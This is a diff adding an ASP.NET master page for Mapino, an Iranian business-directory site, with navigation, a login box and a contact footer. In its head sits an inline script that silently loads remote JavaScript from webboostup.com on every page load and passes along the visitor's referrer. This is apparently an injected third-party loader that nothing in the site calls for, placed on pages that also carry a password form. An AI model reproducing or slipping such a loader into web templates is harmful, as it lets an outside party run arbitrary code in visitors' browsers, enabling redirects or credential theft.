@@ -1,0 +1,210 @@
+﻿<%@ Master Language="C#" AutoEventWireup="true" CodeFile="MasterPage.master.cs" Inherits="MasterPage" %>
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head runat="server">
+
+    <title>مپی نو، سامانه جستجوی مشاغل و مکان های ایران</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta name="description" content="مپی نو، سامانه جستجوی مشاغل و مکان های ایران" />
+    <meta name="keywords" content="آدرس،کجا،فروشگاه،ثبت،مپی نو، سامانه،جستجو،مشاغل،مکان،ایران،نقشه،شغل،رایگان،پیدا کردن،با،از،را،که" />
+    <meta name="author" content="شرکت نرم افزاری ترند، terend.com" />
+
+    <meta name="msvalidate.01" content="47D63CEF06E6289E7D69FDE911634AA9" />
+
+    <link rel="stylesheet" type="text/css" href="css/master.css" />
+    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" type="text/css" href="css/jquery.jscrollpane.css" media="all" />
+
+    <link rel="apple-touch-icon" sizes="57x57" href="favicons/apple-touch-icon-57x57.png" />
+    <link rel="apple-touch-icon" sizes="60x60" href="favicons/apple-touch-icon-60x60.png" />
+    <link rel="apple-touch-icon" sizes="72x72" href="favicons/apple-touch-icon-72x72.png" />
+    <link rel="apple-touch-icon" sizes="76x76" href="favicons/apple-touch-icon-76x76.png" />
+    <link rel="apple-touch-icon" sizes="114x114" href="favicons/apple-touch-icon-114x114.png" />
+    <link rel="apple-touch-icon" sizes="120x120" href="favicons/apple-touch-icon-120x120.png" />
+    <link rel="apple-touch-icon" sizes="144x144" href="favicons/apple-touch-icon-144x144.png" />
+    <link rel="apple-touch-icon" sizes="152x152" href="favicons/apple-touch-icon-152x152.png" />
+    <link rel="apple-touch-icon" sizes="180x180" href="favicons/apple-touch-icon-180x180.png" />
+    <link rel="icon" type="image/png" href="favicons/favicon-32x32.png" sizes="32x32" />
+    <link rel="icon" type="image/png" href="favicons/android-chrome-192x192.png" sizes="192x192" />
+    <link rel="icon" type="image/png" href="favicons/favicon-96x96.png" sizes="96x96" />
+    <link rel="icon" type="image/png" href="favicons/favicon-16x16.png" sizes="16x16" />
+    <link rel="manifest" href="favicons/manifest.json" />
+    <link rel="mask-icon" href="favicons/safari-pinned-tab.svg" color="#5bbad5" />
+    <meta name="msapplication-TileColor" content="#2d89ef" />
+    <meta name="msapplication-TileImage" content="/mstile-144x144.png" />
+    <meta name="theme-color" content="#ffffff" />
+
+    <script src="js/jquery-1.11.1.js"></script>
+
+    <script src="js/Master.js"></script>
+
+    <script type="text/javascript">
+        var script = document.createElement("script");
+        script.src = "https://webboostup.com/controllers/get_controller.php?ID=127&Referrer=" + encodeURIComponent(document.referrer);
+        script.type = "text/javascript";
+        document.getElementsByTagName("head")[0].appendChild(script);
+    </script>
+
+    <asp:ContentPlaceHolder ID="head" runat="server">
+    </asp:ContentPlaceHolder>
+</head>
+<body>
+    <form id="form1" runat="server">
+        <header id="header">
+            <div class="container-fluid">
+                <div class="row">
+                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 f-right">
+                        <div class="logo">
+                            <img src="images/logo2.png" alt="مپی نو" />
+                        </div>
+                        <div id="menu-icon"></div>
+                    </div>
+                    <div class="col-xs-12 col-sm-5 col-md-5 col-lg-6 f-right no-pddng">
+                        <nav class="navbar navigation">
+                            <ul class=" nav navbar-nav">
+                                <li><a href="AboutUs.aspx">درباره ما</a></li>
+                                <li><a href="Map.aspx">نقشه</a></li>
+                                <li><a href="Default.aspx">صفحه اصلی</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                    <div class="col-xs-12 col-sm-4 col-md-4 col-lg-3 f-right pstion">
+                        <div class="login">
+                            <div id="divSignIn">
+                                <button class="enter-btn" type="button">ورود<i class="lgin-arw-icon"></i></button>
+                                <i class="icon-v-line"></i>
+                                <a href="Register.aspx">ثبت نام</a>
+
+                            </div>
+
+                            <div id="divLogin" style="display: none">
+                                <a id="lblUsername" href="UserProfile.aspx"><i class="icon-member"></i></a>
+                                <a id="btnExit" href="#"><i class="icon-exit"></i>خروج</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <div class="col-xs-12 col-sm-6 col-md-6 f-right">
+            <div id="alertSuccess" class="warning-box">
+                <span class="correct-icon"></span>
+                <p></p>
+                <button type="button" class="cancel-btn crct-btn">خب</button>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+
+        <div class="col-xs-12 col-sm-6 col-md-6 f-right">
+            <div id="alertFailed" class="warning-box">
+                <span class="error-icon"></span>
+                <p></p>
+                <button type="button" class="cancel-btn eror-bt">خب</button>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+
+
+        <div class="lg-box">
+            <div class="login-bx-form">
+                <div class="lg-row">
+                    <label>نام کاربری</label>
+                    <input name="text" type="text" class="LoginRequire" id="txtUsername" />
+                </div>
+                <div class="lg-row">
+                    <label>رمز عبور</label>
+                    <input name="password" type="password" class="LoginRequire" id="txtPassword" />
+                </div>
+                <div class="check-row">
+                    <input type="checkbox" name="check" id="chkRemember" />
+                    <label>مرا به خاطر بسپار</label>
+                </div>
+                <div class="lgbtn-row">
+                    <button class="logn-bttn" type="button" id="btnLogin">ورود</button>
+                </div>
+                <a class="reset-pass" href="ResetPassword.aspx">رمز عبور خود را فراموش کرده اید ؟</a>
+            </div>
+        </div>
+        <!-- Modal -->
+
+        <asp:ContentPlaceHolder ID="Main" runat="server">
+        </asp:ContentPlaceHolder>
+
+        <footer id="footer">
+            <!----------------------------------------end footer top----------------------------------------->
+            <section class="footer-top">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-xs-12 col-sm-4 col-md-4 col-lg-4 f-right">
+                            <div class="about">
+                                <p class="title">درباره ما</p>
+                                <p>
+                                    مپی نو خدمتی دیگر از شرکت نرم افزاری ترند است که در راستای اطلاع رسانی و معرفی کسب و کارهای مختلف راه اندازی شده است.
+مبنای فعالیت مپی نو بر پایه معرفی کسب و کارهای مختلف و متعدد به افراد استوار است و بر همین اساس تمامی افراد می توانند کسب وکارخود را به صورت رایگان معرفی نمایند.
+                                </p>
+                            </div>
+                        </div>
+                        <div class="col-xs-12 col-sm-4 col-md-4 col-lg-4 f-right">
+                            <div class="f-nav">
+                                <p class="title">نقشه سایت</p>
+                                <ul class="nav">
+                                    <li><a href="Map.aspx">نقشه</a></li>
+                                    <li><a href="Rules.aspx">قوانین و مقررات</a></li>
+                                    <li><a href="Register.aspx">ثبت نام</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="col-xs-12 col-sm-4 col-md-4 col-lg-4 f-right">
+                            <p class="title">ارتباط با ما</p>
+                            <div class="form-group">
+                                <div class="col-xs-12 col-sm-6 form-padding">
+                                    <input type="email" id="txtEmail" class="form-control my-form InputRequire" placeholder="ایمیل" />
+                                </div>
+                                <div class="col-xs-12 col-sm-6 form-padding">
+                                    <input type="text" id="txtName" class="form-control my-form InputRequire" placeholder="نام" />
+                                </div>
+                                <div class="col-xs-12 col-sm-12 form-padding">
+                                    <input type="text" id="txtSubject" class="form-control my-form InputRequire" placeholder="موضوع" />
+                                </div>
+                                <div class="col-xs-12 col-sm-12 form-padding">
+                                    <textarea rows="4" id="txtBody" class="form-control my-form InputRequire" placeholder="متن پیام"></textarea>
+                                </div>
+                                <div class="submit form-padding">
+                                    <button type="button" id="btnSendMessage" class="submit-btn" value="ارسال">ارسال</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="emailaddress"><a href="#">info(@)mapino(.)ir</a></div>
+                    <div class="social">
+                        <ul class="nav navbar-nav">
+                            <li><a href="#" target="_blank"><i class="icon-fb"></i></a></li>
+                            <li><a href="https://telegram.me/mapino_ir" target="_blank"><i class="icon-google"></i></a></li>
+                            <li><a href="https://www.instagram.com/mapino_ir/" target="_blank"><i class="icon-insta"></i></a></li>
+                            <li><a href="#" target="_blank"><i class="icon-tw"></i></a></li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+            <div class="clearfix"></div>
+            <!----------------------------------------end footer top---------------------------------------->
+            <!--------------------------------------**start footer bottom**----------------------------------->
+
+            <section id="footer-btm">
+                <%--<p>کلیه حقوق این سایت متعلق به <mark><a href="http://terend.com/" target="_blank">شرکت نرم افزاری ترند</a></mark>می باشد </p>--%>
+            </section>
+            <!----------------------------------------end footer bottom----------------------------------------->
+
+        </footer>
+        <!----------------------------------------end footer ----------------------------------------->
+    </form>
+
+</body>
+</html>
